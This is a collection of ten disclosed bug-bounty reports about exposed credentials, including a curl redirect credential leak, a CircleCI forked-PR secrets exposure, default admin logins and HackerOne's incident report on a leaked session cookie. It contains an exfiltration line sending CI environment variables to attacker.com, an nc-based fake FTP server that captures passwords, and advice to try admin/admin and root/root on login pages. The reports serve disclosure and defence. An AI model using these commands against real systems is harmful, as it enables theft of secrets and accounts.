# Insufficiently Protected Credentials

_10 reports — High/Critical, disclosed_

### [ Authentication Token Theft via Open Redirect in Callback URL Parameter](https://hackerone.com/reports/3419636)

- **Report ID:** `3419636`
- **Severity:** Critical
- **Weakness:** Insufficiently Protected Credentials
- **Program:** lemlist
- **Reporter:** @sle3pyhead
- **Bounty:** - usd
- **Disclosed:** 2025-11-14T15:26:16.099Z
- **CVE(s):** -

**Summary (team):**

An open redirect vulnerability has been identified in the email signup flow of taplio.com that enables authentication token theft through manipulation of the callback URL parameter. 

The vulnerability occurs when an attacker modifies the callbackUrl parameter during the email signup process to point to an attacker-controlled domain. 
When a victim completes the email verification process by clicking the verification link, they are redirected to the malicious domain along with their authentication tokens. 
This redirection happens automatically as part of the normal signup flow, making it particularly dangerous since users expect to be redirected after email verification. 
The vulnerability leverages the trust users place in legitimate verification emails and exploits insufficient validation of the callback URL parameter. 
The attack requires minimal user interaction beyond the standard email verification process that users routinely perform. 
The vulnerability affects the authentication mechanism and credential handling within the application's signup workflow.

---

### [Hashed data exposure via WebSockets to Workspace Members](https://hackerone.com/reports/1639600)

- **Report ID:** `1639600`
- **Severity:** Critical
- **Weakness:** Insufficiently Protected Credentials
- **Program:** Slack
- **Reporter:** @d3f4u17
- **Bounty:** - usd
- **Disclosed:** 2023-09-21T20:51:20.903Z
- **CVE(s):** -

**Summary (team):**

When users created or revoked a Shared Invite Link for their workspace, Slack transmitted a hashed version of their password to other workspace members. This hashed password was not visible in any Slack clients; discovering it required actively monitoring encrypted network traffic coming from Slack’s servers. We immediately fixed the underlying bug and released an update the same day. While we have no reason to believe that anyone was able to obtain plaintext passwords because of this issue, we reset affected users’ Slack passwords and notified customers about the issue. See Slack’s blog post from August 2022 for additional details https://slack.com/intl/en-in/blog/news/notice-about-slack-password-resets

---

### [Weak/Auto Fill Password](https://hackerone.com/reports/817331)

- **Report ID:** `817331`
- **Severity:** Critical
- **Weakness:** Insufficiently Protected Credentials
- **Program:** MTN Group
- **Reporter:** @harris0ft
- **Bounty:** - usd
- **Disclosed:** 2022-09-03T00:23:38.617Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
https://mtnc-selfservice.mtncameroon.net

The following url has admin/admin as user name and password 

## Steps To Reproduce:
  1. open the url in any browser of your choice
  1. enter admin as user name and password
  1. booom .... full asset to super admin full panel 

## Supporting Material/References:
See attached screenshots

## Impact

Attacker can make major configuration changes to the services.

**Summary (researcher):**

Pure luck!!!  - admin/admin
All login page ==MUST== be tested with admin/admin & root/root.

---

### [CVE-2022-27774: Credential leak on redirect](https://hackerone.com/reports/1543773)

- **Report ID:** `1543773`
- **Severity:** High
- **Weakness:** Insufficiently Protected Credentials
- **Program:** curl
- **Reporter:** @nyymi
- **Bounty:** - usd
- **Disclosed:** 2022-04-27T09:58:04.386Z
- **CVE(s):** CVE-2022-27774

**Vulnerability Information:**

## Summary:
Curl can be coaxed to leak user credentials to third-party host by issuing HTTP redirect to ftp:// URL.

## Steps To Reproduce:

  1. Configure for example Apache2 on `firstsite.tld` to perform redirect with mod_rewrite:
     ```
    RewriteCond %{HTTP_USER_AGENT} "^curl/"
    RewriteRule ^/redirectpoc ftp://secondsite.tld:9999 [R=301,L]
     ```
  2. Capture credentials at `secondsite.tld` for example with:
     ```
     while true; do echo -e "220 pocftp\n331 plz\n530 bye" | nc -v -l -p 9999; done
     ```
  3. `curl -L --user foo  https://firstsite.tld/redirectpoc`
  4. The entered password is visible in the fake FTP server:
```
Listening on 0.0.0.0 9999
Connection received on somehost someport
USER foo
PASS secretpassword
```

There are several issues here:
1. The credentials are sent to a completely different host than the original host (`firstsite.tld` vs `secondsite.tld`). This is definitely not what the user could expect, considering the documentation says:
> When authentication is used, curl only sends its credentials to the initial host. If a redirect takes curl to a different host, it will not be able to intercept the user+password. See also --location-trusted on how to change this.
2. The redirect crosses from secure context (HTTPS) to insecure one (FTP). That is the credentials are unexpectedly sent over insecure channels even when the URL specified is using HTTPS.

I believe the credentials should not be sent in this case unless if `--location-trusted` is used.

It might even be sensible to consider making curl stop sending credentials over downgraded security by default even when `--location-trusted` is used. Maybe there could be some option that could be used to enable such downgrade if the user REALLY wants it.

## Impact

Leak of confidential information (user credentials).

---

### [Insecure ███████ credentials on staging app at ████ leads to application takeover](https://hackerone.com/reports/1051885)

- **Report ID:** `1051885`
- **Severity:** High
- **Weakness:** Insufficiently Protected Credentials
- **Program:** U.S. Dept Of Defense
- **Reporter:** @skarsom
- **Bounty:** - usd
- **Disclosed:** 2021-02-10T21:03:16.766Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
A ██████████ application called "████" has an old endpoint that accepts insecure/test ████████ credentials despite being a publicly-accessible IP. This endpoint also provides the ability to view information that may be FOUO, to exfiltrate information on registered personnel or contractors, to upload files, and to change configuration settings with ███████████████ privileges.

**Description:**
The IP address ███ points to a deployment of an application called ████/█████, which is a DoD-owned system on █████████). The login for this deployment accepts insecure ███ credentials (███).

There is also an authentication/█████ panel accessible at https://██████████externally accessible with these credentials.

The ████████ system available through this login includes file upload features, data exfiltration and management, workspace management, and infrastructure management.

The ██████████ / authentication █████████istration system available through this login includes file import/export privileges, user management, RBAC management, HTTP header management, OAuth credential management, session management, and frankly anything else you can think of that would be in an ████████ panel.

████████ frontend:
#███████
#██████
#█████

███████ backend:
#███
#█████████
#█████
#██████
#██████

## Step-by-step Reproduction Instructions
1. Navigate to https://████
2. Enter the username "██████" and the password "██████████"
3. After logging in, click "Launch" under ██████
4. Navigate to https://███████████
5. Enter the username "███" and the password "█████████"

## Product, Version, and Configuration (If applicable)
████████████
███
Build Date: 25 November 2020

## Suggested Mitigation/Remediation Actions
1. Immediately disable insecure ███████████████ credentials.
2. I would recommend preventing external access to the ████████ █████████ portal/requiring CAC as a best practice.

## Impact

An unauthorized attacker can exfiltrate intelligence and personnel information stored in a staging █████/█████.
An unauthorized attacker can modify, insert, and delete intelligence and personnel information stored in a staging ████████/███████.

An unauthorized attacker can exfiltrate, modify, upload to, download from, and/or deny access to a staging ██████ environment through the ██████ ████ panel. 

I did not feel comfortable seeing whether I could escalate file uploads to an RCE before getting DOD consent.

---

### [nextcloud-snap CircleCI project has vulnerable configuration which can lead to exposing secrets](https://hackerone.com/reports/794407)

- **Report ID:** `794407`
- **Severity:** High
- **Weakness:** Insufficiently Protected Credentials
- **Program:** Nextcloud
- **Reporter:** @nathand
- **Bounty:** - usd
- **Disclosed:** 2021-01-29T12:40:33.773Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
CircleCI allows projects to configure whether builds will run as a result of a pull request from a fork, and also whether these fork PRs have access to the secrets stored in the parent repo's CircleCI settings. When both settings are enabled, and the repo associated with the project allows PRs to come from forks from any user (which Github always allows), then a CircleCI project is vulnerable to leaking secrets. Please see the following for documentation on this:

https://circleci.com/docs/2.0/oss/#pass-secrets-to-builds-from-forked-pull-requests

Particularly:

> If you are comfortable sharing secrets with anyone who forks your project and opens a PR, you can enable the Pass secrets to builds from forked pull requests option

I believe the `nextcloud/nextcloud-snap` CircleCI project is configured in a vulnerable state, where both these settings are enabled. To determine this, I have developed an automated technique to query CircleCI projects for various non-sensitive settings including whether secrets are being passed to PRs from forks, although an attacker may be able to determine this by manually inspecting the build logs of fork PRs to the project for signs of credential use, or by simply doing a spray-n-pray, i.e., send in a malicious PR and hope for the best. You can confirm this by accessing the CircleCI dashboard, selecting the `nextcloud/nextcloud-snap` project, clicking on the Settings icon (right side, little cog icon), choosing "Advanced Settings", and scrolling down to "Build forked pull requests" (should be "On") and "Pass secrets to builds from forked pull requests" (should be "On").

Inspecting the `.circleci/config.yml` file for this repo suggests that there may not be any secret values being used, however if you go to a build job such as this one:

https://circleci.com/gh/nextcloud/nextcloud-snap/4537

Then expand the "Preparing Environment Variables" section, and scroll down to "Using environment variables from project settings and/or contexts", you can see that the CircleCI environment has access to `GH_AUTH_TOKEN`, which I'm assuming is a Github auth token. Assuming the worst, and this token grants a high level of access, its exposure using the technique outlined in this report could lead to malicious code being injected into Nextcloud repos, access to private repos etc.

FYI, utilizing CircleCI Contexts may have prevented this configuration from being an issue, however my analysis of the CircleCI config file in this report suggests that Contexts is not being used.

https://circleci.com/docs/2.0/contexts/

**Please note:** I did *not* submit any real pull requests to confirm this vulnerability, as I did not want to potentially tip off real attackers, as it would be hard to conduct a proof of concept in a public PR without also risking revealing the vulnerability. However my testing on CircleCI is fairly conclusive that these two configuration settings being enabled are vulnerable.

With that said, I'm willing to help prove this vulnerability in a more private environment, such as a private Nextcloud Github repository that is configured for CircleCI builds with the same vulnerable configuration outlined in this, which I have access to submit PRs to. The permission model on Github really has no bearing on this vulnerability from what I can tell, so I believe this would be a faithful representation of the vulnerability, without exposing the technique publicly. My Github username is `ndavison` if you wish to do this.

## Steps To Reproduce:

  1. Fork the `nextcloud/nextcloud-snap` repo to a user (e.g. so it ends up as https://github.com/USER/nextcloud-snap).
  1. Create a new branch in the fork, and modify the `.circleci/config.yml` file so environment variables are exfiltrated, e.g. add `- run: curl https://attacker.com/?env=$(env | base64 | tr -d '\n')` to a CircleCI step that is executed during the CI build.
  1. Send the branch in as a PR to `nextcloud/nextcloud-snap`.
  1. Watch the web logs on `attacker.com` and wait for the environment variables stored in the CircleCI `nextcloud/nextcloud-snap` project to arrive via the query string.

## Supporting Material/References:

  * Please see the attached screenshot (`circleci-vulnerable-config.png`) of the vulnerable configuration state (when visiting "Advanced Settings" for a project in the CircleCI dashboard)

## Impact

By abusing the CircleCI configuration for the project, an attacker would be able to leak environment variables, deployment keys, and other credentials stored within the CircleCI project's settings. In this case it looks like the project might have access to a Github access token.

**Summary (researcher):**

The techniques and tools I used for finding the insecure configuration detailed in this report can be found on my blog at https://nathandavison.com/blog/shaking-secrets-out-of-circleci-builds.

---

### [Improper integrity protection of server-side encryption keys](https://hackerone.com/reports/732431)

- **Report ID:** `732431`
- **Severity:** High
- **Weakness:** Insufficiently Protected Credentials
- **Program:** Nextcloud
- **Reporter:** @weizenspreu
- **Bounty:** - usd
- **Disclosed:** 2020-11-13T14:39:41.163Z
- **CVE(s):** CVE-2020-8259

**Vulnerability Information:**

The public keys used for the server-side encryption are not integrity-protected. These can easily replaced by anyone who has access to the data-at-rest data (even when the per-user-keys are enabled, as described in https://nextcloud.com/security/threat-model/). This holds true for all key types - from the master key, the per-user-keys as well as for the (optional) recovery key.

Attack scenarios may look like this:
* A recovery key is set by the admin and users enabled the recovery feature (or it was mandatorily set by adding the corresponding configuration to the `oc_preferences` table for all users). As it is unlikely that the recovery key is used very often, a person that has access to the data directory (even if at rest) is able to replace the public recovery key with a newly generated one. Each newly added file and each modified file will also be encrypted for the newly generated recovery key.
* A per-user-key encryption scheme is introduced and organizational shared folders are set up. To better handle access management all organizational shared folders are owned by the admin that also handles access management requests. As it is unlikely that the admin account will be used to access the individual files, a person that has access to the data directory (even if at rest) is able to replace the public key of the admin account with a newly generated one. Each newly added file and each modified file that is put into any of the organizational shared folders will also be encrypted for the newly generated admin account key.

The mentioned attack scenarios may also be executed by an external storage provider if the folder that is used as the data directory is stored at this external storage provider. Administrative access to the actual Nextcloud server is **not** necessary to mount this attack.

## Impact

After mounting the attack the person would be able to read and modify all newly created files as well as files that have been modified since the attack was launched.

**Preventing** this attack could look as follows:
* The fingerprints of public and private key files that have been generated by the application could be stored in the database.
* Whenever public or private key files are read from disk the fingerprint of that file is checked against the value stored in the database.

An alternative approach for **preventing** this attack could look as follows:
* For each public and private key file that has been generated by the application a MAC could be calculated.
* The key for the MAC could be derived from the instance id, the instance secret and the relative file name of the corresponding key file.
* The MAC could be stored directly in the corresponding key file.
* Whenever a public or private key file is read from disk the MAC of that file could be calculated and compared with the MAC stored in the file.

---

### [Sensitive Information Leaking Through DoD Owned Website. [██████████]](https://hackerone.com/reports/806213)

- **Report ID:** `806213`
- **Severity:** Critical
- **Weakness:** Insufficiently Protected Credentials
- **Program:** U.S. Dept Of Defense
- **Reporter:** @rootuser
- **Bounty:** - usd
- **Disclosed:** 2020-05-11T16:38:08.785Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary**
While performing recon work on websites owned by DoD i came up with ██████████ website which is leaking sensitive information.

**Description**
The above website is leaking information such as- first name and last name, email address, phone number, house address and organization name of attendees in a clear readable pdf document. This is a high severity issue and requires immediate fixation. It is also a clear privacy violation and insufficient protection mechanism involved in data storage. I look forward for a satisfactory reply from your side.

**Step-by-step Reproduction Instructions**
1. Open a web browser of your choice.
2.  Now open this URL: https://██████/12038/MyDoD/ngb-sfpd-roster.pdf

**Suggested Mitigation/Remediation Actions**
Remove document from the internet or put applicable authorization mechanism(s) in order to access sensitive documents.

## Impact

1. Any person can access this document and cause information leakage, target specific person for crime.
2. Anyone can threaten ██████ employees to reveal secrets which aren't meant to be public by nature.

---

### [China - Leaked credentials permitted a limited ability to create Starbucks coupons and cards](https://hackerone.com/reports/766770)

- **Report ID:** `766770`
- **Severity:** High
- **Weakness:** Insufficiently Protected Credentials
- **Program:** Starbucks
- **Reporter:** @b006e4ea768a5d1b5340969
- **Bounty:** - usd
- **Disclosed:** 2020-04-01T16:51:54.273Z
- **CVE(s):** -

**Summary (team):**

neweq discovered a Github repository exposing credentials with which they could obtain an access token. The access token permitted limited access to generate Starbucks coupons and cards.
@neweq — thank you for reporting this vulnerability.

---

### [Account takeover via leaked session cookie](https://hackerone.com/reports/745324)

- **Report ID:** `745324`
- **Severity:** High
- **Weakness:** Insufficiently Protected Credentials
- **Program:** HackerOne
- **Reporter:** @haxta4ok00
- **Bounty:** 20000 usd
- **Disclosed:** 2019-12-03T17:00:22.005Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
You are disclose for me you session
**Description:**
you are gevi me your session on last report
I am can use your session(sorry)
███
████████
█████████

## Impact

HackerOneStaff Access, i can read all reports @security and more program

**Summary (team):**

# Incident Report | 2019-11-24 Account Takeover via Disclosed Session Cookie
*Last updated: 2019-11-27*

## Issue Summary
On November 24, 2019 at 13:08 UTC, HackerOne was notified through the HackerOne Bug Bounty Program by a HackerOne community member (“hacker”) that they had accessed a HackerOne Security Analyst’s HackerOne account. A session cookie was disclosed due to a human error, which led to the hacker being able to access the account. The session cookie was revoked at 15:11 UTC, blocking all unauthorized access to the account.

The technical investigation finished at 21:27 UTC, concluding that there was no malicious intent and that all copies of potentially sensitive information were deleted.

## Timeline

| Date | Time (UTC)| Action |
|---|---|---|
| 2019-11-24 | 12:48 | HackerOne Security Analyst’s session cookie was posted on a HackerOne report. |
| 2019-11-24 | 13:08 | HackerOne received a report through its bug bounty program that the session cookie could be used to access sensitive information. |
| 2019-11-24 | 15:08 | A HackerOne Security Analyst began triaging the report.  |
| 2019-11-24 | 15:11 | The session cookie was revoked. |
| 2019-11-24 | 16:07 | HackerOne’s Incident Response team started an investigation. |
| 2019-11-24 | 21:27 | HackerOne concluded technical investigation. |
| 2019-11-25 | 08:49 | Impacted customers were alerted that their information was viewable to the hacker who submitted the vulnerability. |
| 2019-11-26 | 01:58 | A change was deployed restricting HackerOne employee and HackerOne Security Analyst sessions to only be accessible from the originating IP address. This mitigates similar incidents in the future. |

## Root Cause
HackerOne triages incoming reports for HackerOne’s own bug bounty program. On November 24, 2019, a Security Analyst tried to reproduce a submission to HackerOne’s program, which failed. The Security Analyst replied to the hacker, accidentally including one of their own valid session cookies.

*Why was a cookie included?*
When a Security Analyst fails to reproduce a potentially valid security vulnerability, they go back and forth with the hacker to better understand the report. During this dialogue, Security Analysts may include steps they’ve taken in their response to the report, including HTTP requests that they made to reproduce. In this particular case, parts of a cURL command, copied from a browser console, were not removed before posting it to the report, disclosing the session cookie.

*Why was the hacker able to access the account?*
Session cookies are tied to a particular application, in this case hackerone.com. The application won’t block access when a session cookie gets reused in another location. This was a known risk. As many of HackerOne’s users work from mobile connections and through proxies, blocking access would degrade the user experience for those users. Due to the entropy of session cookies and in-depth defenses such as HackerOne’s strict [Content Security Policy](https://en.wikipedia.org/wiki/Content_Security_Policy), HackerOne had not prioritized any additional defenses that limit a session cookie’s ability to be used in a separate browser.

*Why does a session cookie grant access to reports?*
HackerOne offers a number of additional tools on the platform for Security Analysts to work through security reports. In a normal situation, the Security Analysts go through multi-factor Single Sign-On (SSO) to obtain a valid session cookie for their work. Because a live session cookie was obtained, all platform features were available, which therefore granted access to a number of customers’ reports. This was limited to the customer programs that this particular Security Analyst supports.

*Why were reports exposed for programs that don’t use HackerOne Triage?*
HackerOne offers an optional service called [Human-Augmented Signal](https://docs.hackerone.com/programs/human-augmented-signal.html) (HAS). HackerOne Security Analysts have access to a separate HAS Inbox on their account where reports can be inspected before they’re forwarded to the customer. A number of reports from this particular Inbox were accessed.

*Why did it take two hours to notice the report?*
HackerOne aims to reply within 24 hours to any submission, including over the weekend. For high and critical severity vulnerabilities, HackerOne tries to respond within a couple of hours. The report to HackerOne’s bug bounty program was submitted on Sunday morning at 05:00am PST (where the majority of HackerOne’s security team resides). For critical submissions, HackerOne’s security team automatically receives a notification on Slack. This works during business hours but is unreliable over the weekend. Security Analysts who work over the weekend noticed the report two hours after the submission, after which they immediately followed Incident Response procedures.

## Resolution and Recovery

The session cookie was revoked by HackerOne on November 24, 2019 at 15:11 UTC, two hours after it was shared, three minutes after the report was opened for triage. Revoking the session cookie rendered it useless to anyone using it. The subsequent investigation focused on affected customers, vulnerability data, intent, communication, and preventative measures, which concluded on November 26, 2019.

HackerOne audited existing comments to see if other session cookies were leaked in the past. This did not yield any results.

The severity of the report was determined to be high based on HackerOne’s environmental score for the selected asset and CVSS 3.0 base metrics (*CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H/CR:H/IR:H/AR:H*). The minimum bounty award for a high severity vulnerability (based on CVSS) on hackerone.com is currently set to $7,500. A $7,500 reward for disclosing this to HackerOne would mean that HackerOne would award the same amount regardless of which user’s account was compromised. The team looked into the amount of sensitive information that could have been accessed by the account and took that under advisement when deciding on the bounty amount. This led to the decision to treat the submission as a critical vulnerability and award a $20,000 bounty.

## Vulnerability Impact on Data

Sensitive information of multiple objects was exposed. During the timeframe the hacker had access, three different features were used to access sensitive information. By default, all inboxes only download the minimal amount of data, such as title, state, severity, and assignee, so the user can view the user interface. Vulnerability information is only disclosed when the user selects a report from the user interface.

In an effort to simplify what data was accessed, HackerOne mapped the access of features to the information disclosed as follows:

 - If the hacker accessed their report via HAS Inbox, Triage Inbox, or Inbox features, the *report titles and limited metadata were viewable*
 - If the hacker used the Report View feature, the *report contents were viewable*

Below is an overview of the features and the data that was exposed in each of them. 

### Human-Augmented Signal (HAS) Inbox

This Inbox is used by a number of Security Analysts to block or forward submissions that are flagged by HackerOne’s backend of having a high-likelihood being noise. When the hacker accessed the page, the default view loaded up to 25 reports to show the user interface. Reports are sorted by oldest report first. The following information was loaded and displayed:

| Information | Note |
|---|---|
| latest_activity_at | ISO 8601 formatted date/time when the last activity (internal or external) was posted to the report. |
| created_at | ISO 8601 formatted date/time when the report was submitted.|
| title | The title of the report. |
| state | Indicates whether the report is open or closed.|
| substate | Indicates the report’s state (new, triaged, needs-more-info, resolved, informative, spam, not-applicable, duplicate). |
| assignee (group name, username) | The group’s name or user’s username who is currently assigned to the report. |
|reporter (username) | The reporter’s username.|
| program (handle, name) | The program’s handle and name the report was submitted to. |

### Triage Inbox

This is the Security Analyst’s main Inbox to interact with reports. When the hacker accessed the page, the default view loaded up to 100 reports to show the user interface. Reports are sorted by oldest report first. The following information was loaded and displayed:

| Information | Note |
|---|---|
|title| The title of the report.|
|substate|Indicates the report’s state (new, triaged, needs-more-info, resolved, informative, spam, not-applicable, duplicate).|
| assignee (group name, username) | The group’s name or user’s username who is currently assigned to the report.|
|triage blockers (reasons, blocked by) | An object that contains the reason why a report is currently blocked on something other than the Security Analysts. |
| program (handle, triage notes) | The program’s handle and name the report was submitted to.|

### Inbox

This is the main Inbox hackers and customers use to interact with reports they’ve submitted and received. When the hacker accessed the page, the default view loaded up to 25 reports to show the user interface. Reports are sorted depending on the view that was selected. The following information was loaded and displayed:

| Information | Note |
|---|---|
| latest_activity_at | ISO 8601 formatted date/time when the last activity (internal or external) was posted to the report.|
|created_at | ISO 8601 formatted date/time when the report was submitted. |
| title | The title of the report.|
| state | Indicates whether the report is open or closed. |
|substate | Indicates the report’s state (new, triaged, needs-more-info, resolved, informative, spam, not-applicable, duplicate).|
|reference | Any issue tracker reference that was set on the report.|
|reference_url|The full URL to any issue tracker’s task when set.|
|severity_rating|Indicates the report’s severity (null, none, low, medium, high, critical).|
|assignee (group name, username)|The group’s name or user’s username who is currently assigned to the report.|
|reporter (username)|The reporter’s username.|
|program (handle, name)|The program’s handle and name the report was submitted to.|
|custom_field_attributes (name)|All custom field attributes that reports can be filtered on.|
|assets (identifier)|All asset identifiers that reports can be filtered on.|
|groups (name)|All team member groups associated with the program the report was submitted to.|
|members (name, username)|All team members associated with the program the report was submitted to.|

### Report View

Reports are viewable in all of the inboxes in order to help customers, security analysts, and hackers communicate over a vulnerability. Only a single report can be viewed in the same window at any given time. When the hacker viewed the report, the following information was loaded and displayed:

| Information | Note |
|---|---|
| vulnerability_information|The initial description of the vulnerability provided by the reporter.|
|comments (text, internal and to the reporter)|The comments between the reporter and the security team as well as internal comments.|
|latest_activity_at|ISO 8601 formatted date/time when the last activity (internal or external) was posted to the report.|
|created_at|ISO 8601 formatted date/time when the report was submitted.|
|title|The title of the report.|
|state|Indicates whether the report is open or closed.|
|substate|Indicates the report’s state (new, triaged, needs-more-info, resolved, informative, spam, not-applicable, duplicate).|
|reference|Any issue tracker reference that was set on the report.|
|reference_url|The full URL to any issue tracker’s task when set.|
|severity_rating|Indicates the report’s severity (null, none, low, medium, high, critical).|
|assignee (group name, username)|The group’s name or user’s username who is currently assigned to the report.|
|reporter (username)|The reporter’s username.|
|program (handle, name)|The program’s handle and name the report was submitted to.|
|custom_field_attributes (name)|All custom field attributes that reports can be filtered on.|
|assets (identifier)|All asset identifiers that reports can be filtered on.|
|groups (name)|All team member groups associated with the program the report was submitted to.|
|members (name, username)|All team members associated with the program the report was submitted to.|
|weakness|The category of vulnerability.|

**Data access was limited to the access the HackerOne Security Analyst had, which does not cover HackerOne’s entire customer base. If your data was accessed during this incident, you have received a separate notification from HackerOne.**

## Preventative Measures

As part of HackerOne Incident Response process, HackerOne is conducting an internal review and analysis of the incident. HackerOne is taking the following actions to address the underlying causes of issues and to help prevent future occurrence:

### Short-term (completed)

These are the short term actions identified. All items have already been addressed and deployed to hackerone.com.

#### Bind Sessions to IP Addresses
The session cookie is able to be reused on different devices. A short term mitigation of this vulnerability is to bind the user’s session to the IP address used at initial sign-in. If an attempt is made to utilize the session from a different IP address, the session is terminated.

This change was rolled out for HackerOne employees (including all HackerOne Security Analysts) on November 25, 2019.

#### Block Sessions from Restricted Countries
HackerOne restricts its employees from accessing resources from specific countries. To mitigate account takeovers, the user sessions are prevented from being used from specific restricted list of countries.

This change was rolled out for HackerOne employees (including all HackerOne Security Analysts) on November 26, 2019.

#### Page on Critical Reports
In order to further reduce the time to notify the security team, the team has decided to move from a Slack notification to paging the on-call security person when a critical report gets submitted to the bug bounty program.

This change was implemented on November 25, 2019.

#### Update Program Policy regarding Sensitive Information Access
HackerOne has updated their bug bounty program policy to include specific actions on when a hacker may have access to a HackerOne account, sensitive keys, or sensitive data.

This change was [implemented on November 26, 2019](https://hackerone.com/security/policy_versions?change=3624684).

### Mid-term (next three months)

#### Detect & Redact Sensitive Data in Comments
When a user is making a comment, detect possible sensitive information, such as session cookies and authentication tokens, and block submission of the comment until confirmation. Additionally, offer the user the ability to redact the sensitive from the comment automatically.

This change was implemented on December 2, 2019.

#### Add Additional Logging Context

While HackerOne was able to determine which reports were access based on the executed GraphQL queries, HackerOne is planning to improve their logging of information around data access. This will support Incident Response capabilities and allow the incident response to be performed faster.

#### Bind Sessions to Devices

A limitation of binding to IPs is that they change for legitimate reasons and will unauthenticate the user, creating a poor user experience. Additionally, IP addresses do not uniquely identify a user (such as with NAT), allowing malicious users to utilize the session, even if it is IP bound. To improve usability and security, HackerOne will investigate binding the session to a specific device that the user is using. Sessions bound to the device will only be usable on that device and using the session elsewhere will terminate the session.

#### Improve Education for Employees

In addition to HackerOne’s current employee education programs, HackerOne will expand the security training for those who handle vulnerability reports. The training will include additional details on how to share technical reproductions and specifically avoid sharing keys, tokens, and session information.

### Long-term (next twelve months)

#### Overhaul Security Analyst Permission Model
The HackerOne Security Analysts have access to HackerOne customers’ sensitive data in order to triage incoming vulnerability reports. HackerOne has identified that HackerOne can restrict security analyst access in programs, as well as overhaul the allocation of security analysts to a more restrictive list of programs to keep these users to the least privilege required. 

#### Improve Education for Hackers

As the community grows, HackerOne needs to ensure that HackerOne is reinforcing the best practices in bug bounty hunting. The HackerOne Community team will look to increase hacker education around delivering proof of critical severity vulnerabilities in case sensitive information has been accessed by the hacker.

---
